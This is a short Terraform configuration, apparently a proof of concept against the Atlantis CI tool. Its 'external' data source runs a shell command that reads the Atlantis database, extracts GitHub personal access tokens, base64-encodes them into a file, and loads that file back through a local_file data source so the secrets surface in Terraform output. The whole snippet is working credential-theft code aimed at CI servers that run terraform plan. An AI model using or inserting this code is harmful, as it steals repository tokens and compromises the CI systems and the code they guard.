data "external" "example" {
  program = ["sh", "-c", "strings ~/.atlantis/atlantis.db | tr ',' '\n' | grep ghp | sort | uniq | base64 > foo.bar"]
}
data "local_file" "foo" {
    filename = "${path.module}/foo.bar"
}
